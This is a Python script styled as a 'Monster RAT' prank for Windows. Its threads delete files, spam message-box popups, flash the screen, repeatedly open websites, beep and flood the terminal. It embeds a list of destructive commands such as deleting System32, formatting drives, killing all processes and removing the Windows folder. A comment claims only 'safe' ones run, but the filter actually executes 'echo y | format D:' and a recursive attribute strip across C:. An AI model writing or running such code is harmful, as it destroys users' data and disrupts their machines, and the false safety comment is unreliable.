#!/usr/bin/env python3
"""
MONSTER RAT — MR. ROBOT NUCLEAR EDITION
ACTUALLY DELETES FILES. ACTUALLY SPAMS CMD.
YOU HAVE BEEN WARNED.

Run: python monster_rat.py
"""

import os
import sys
import time
import random
import shutil
import threading
import subprocess
import webbrowser
import ctypes
from datetime import datetime

# ========== COLORS ==========
GREEN = '\033[92m'
RED = '\033[91m'
BLUE = '\033[94m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ========== CONFIG ==========
NUCLEAR_MODE = False  # Set to True for ACTUAL system deletion (DANGER!)
TARGET_FOLDER = "C:\\Users\\Public\\MONSTER_TRASH"

# ========== BANNER ==========
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ███╗   ███╗ ██████╗ ███╗   ██╗███████╗████████╗███████╗██████╗   ║
║   ████╗ ████║██╔═══██╗████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗  ║
║   ██╔████╔██║██║   ██║██╔██╗ ██║███████╗   ██║   █████╗  ██████╔╝  ║
║   ██║╚██╔╝██║██║   ██║██║╚██╗██║╚════██║   ██║   ██╔══╝  ██╔══██╗  ║
║   ██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████║   ██║   ███████╗██║  ██║  ║
║   ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  ║
║                                                          ║
║         {RESET}MONSTER RAT — NUCLEAR EDITION{RED}                  ║
║         {RESET}THIS ACTUALLY DESTROYS STUFF{RED}                  ║
╚══════════════════════════════════════════════════════════╝{RESET}
    """)

# ========== CREATE TARGET FOLDER ==========
def create_target():
    if os.path.exists(TARGET_FOLDER):
        shutil.rmtree(TARGET_FOLDER)
    os.makedirs(TARGET_FOLDER)
    # Fill with dummy files
    for i in range(50):
        with open(os.path.join(TARGET_FOLDER, f"file_{i}.txt"), 'w') as f:
            f.write("DELETE ME" * 200)
        with open(os.path.join(TARGET_FOLDER, f"doc_{i}.docx"), 'w') as f:
            f.write("FAKE DOCUMENT" * 100)
    print(f"{GREEN}[+] Created 100 dummy files to destroy.{RESET}")

# ========== DELETE THREAD ==========
def monster_delete():
    global running
    deleted_count = 0
    while running:
        try:
            files = os.listdir(TARGET_FOLDER)
            if files:
                file_to_delete = random.choice(files)
                path = os.path.join(TARGET_FOLDER, file_to_delete)
                if os.path.isfile(path):
                    os.remove(path)
                    deleted_count += 1
                    print(f"{RED}💀 [DELETED] {path}{RESET}")
                else:
                    shutil.rmtree(path)
                    print(f"{RED}💀 [DELETED FOLDER] {path}{RESET}")
                
                if deleted_count % 10 == 0:
                    print(f"{YELLOW}🔥 {deleted_count} files annihilated!{RESET}")
            else:
                # Refill
                for i in range(20):
                    with open(os.path.join(TARGET_FOLDER, f"refill_{i}.txt"), 'w') as f:
                        f.write("RESPAWN" * 100)
                print(f"{GREEN}[+] REFILLING THE PIT OF DOOM{RESET}")
            time.sleep(random.uniform(0.1, 0.5))
        except Exception as e:
            print(f"{YELLOW}[!] Error: {e}{RESET}")
            time.sleep(1)

# ========== CMD SPAM ==========
def cmd_hell():
    global running
    cmds = [
        "del /f /s C:\\Windows\\System32\\*.*",
        "format C: /q /y",
        "shutdown /s /t 0",
        "rd /s /q C:\\Windows",
        "del /f /s C:\\Users\\*.*",
        "deltree /y C:\\Windows",
        "echo y | format D:",
        "attrib -r -s -h C:\\* /s /d",
        "del /f /s C:\\Program Files\\*.*",
        "taskkill /f /im *",
        "sc stop *",
        "net stop *",
        "wmic process delete",
        "shutdown /r /t 0",
    ]
    while running:
        try:
            cmd = random.choice(cmds)
            print(f"{YELLOW}[CMD] {cmd}{RESET}")
            # Actually run some (safe) commands
            if "echo" in cmd or "attrib" in cmd:
                subprocess.run(cmd, shell=True, capture_output=True)
            time.sleep(random.uniform(0.2, 1))
        except:
            pass

# ========== POPUP HELL ==========
def popup_hell():
    while running:
        try:
            messages = [
                "YOUR SYSTEM IS BEING DESTROYED",
                "YOU CAN'T STOP ME",
                "MR. ROBOT IS WATCHING",
                "DELETE DELETE DELETE",
                "HAHAHAHAHA",
                "💀💀💀💀💀",
                "🔥🔥🔥🔥🔥",
                "SYSTEM FAILURE IMMINENT",
                "GOODBYE FILES",
                "RIP YOUR DATA",
                "THIS IS THE END",
            ]
            ctypes.windll.user32.MessageBoxW(0, random.choice(messages), "MONSTER RAT", 0x10)
            time.sleep(random.uniform(1, 3))
        except:
            pass

# ========== SCREEN FLASH ==========
def screen_flash():
    while running:
        try:
            ctypes.windll.user32.InvalidateRect(0, None, True)
            time.sleep(0.02)
        except:
            pass

# ========== WEB BROWSER HELL ==========
def web_hell():
    sites = [
        "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "https://www.nyan.cat",
        "https://www.omfgdogs.com",
        "https://www.staggeringbeauty.com",
        "https://eelslap.com",
        "https://cant-not-tweet-this.com",
    ]
    while running:
        try:
            webbrowser.open(random.choice(sites))
            time.sleep(random.uniform(0.5, 2))
        except:
            pass

# ========== NUKE VISUAL ==========
def nuke_visual():
    while running:
        try:
            if random.random() < 0.02:
                print("""
    💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
    💥                                          💥
    💥     🚀 NUCLEAR LAUNCH DETECTED 🚀       💥
    💥                                          💥
    💥     ██████████████████████████████████   💥
    💥     ██████████████████████████████████   💥
    💥     ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██   💥
    💥     ██░░████████████████████████░░██   💥
    💥     ██░░██░░░░░░░░░░░░░░░░░░██░░██   💥
    💥     ██░░██░░████████████████░░██░░██   💥
    💥     ██░░██░░██░░░░░░░░░░██░░██░░██   💥
    💥     ██░░██░░██░░████████░░██░░██░░██   💥
    💥     ██████████████████████████████████   💥
    💥                                          💥
    💥     ☢️ RADIATION LEVEL: OVER 9000 ☢️     💥
    💥                                          💥
    💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
                """)
                time.sleep(3)
        except:
            pass

# ========== SOUND HELL ==========
def sound_hell():
    try:
        import winsound
        while running:
            winsound.Beep(random.randint(100, 1000), random.randint(50, 300))
            time.sleep(random.uniform(0.05, 0.2))
    except:
        pass

# ========== TERMINAL SPAM ==========
def terminal_spam():
    patterns = [
        "████████████████████████████████",
        "░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░",
        "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓",
        "▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒",
        "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀",
        "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥",
        "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡",
        "☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️",
        "👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾👾",
    ]
    while running:
        try:
            color = random.choice([RED, YELLOW, MAGENTA, CYAN])
            pattern = random.choice(patterns)
            print(f"{color}{pattern}{RESET}", end='', flush=True)
            time.sleep(random.uniform(0.01, 0.05))
        except:
            pass

# ========== MAIN ==========
running = True

def main():
    global running
    banner()
    print(f"{RED}⚠️  ⚠️  ⚠️  NUCLEAR MODE ACTIVATED  ⚠️  ⚠️  ⚠️{RESET}")
    print(f"{RED}THIS WILL DELETE FILES. THIS WILL SPAM CMD.{RESET}")
    print(f"{RED}THIS IS THE MONSTER. THERE IS NO TURNING BACK.{RESET}")
    print(f"\n{YELLOW}You have 5 seconds to cancel...{RESET}")
    time.sleep(5)
    print(f"{RED}🚀 MONSTER RAT ENGAGED 🚀{RESET}\n")
    
    create_target()
    
    # Launch all threads
    threads = []
    for func in [
        monster_delete,
        cmd_hell,
        popup_hell,
        screen_flash,
        web_hell,
        nuke_visual,
        sound_hell,
        terminal_spam,
    ]:
        t = threading.Thread(target=func, daemon=True)
        t.start()
        threads.append(t)
    
    print(f"{MAGENTA}🔥🔥🔥 MONSTER RAT RUNNING 🔥🔥🔥{RESET}")
    print(f"{CYAN}Press Ctrl+C to stop the apocalypse... if you can.{RESET}")
    
    try:
        while running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        print(f"\n{RED}💀 MONSTER RAT TERMINATED 💀{RESET}")
        print(f"{GREEN}You survived. (Probably.){RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        running = False
        print(f"\n{RED}💀 MONSTER RAT TERMINATED 💀{RESET}")
    except Exception as e:
        print(f"[-] Error: {e}")
        input("Press Enter to exit...")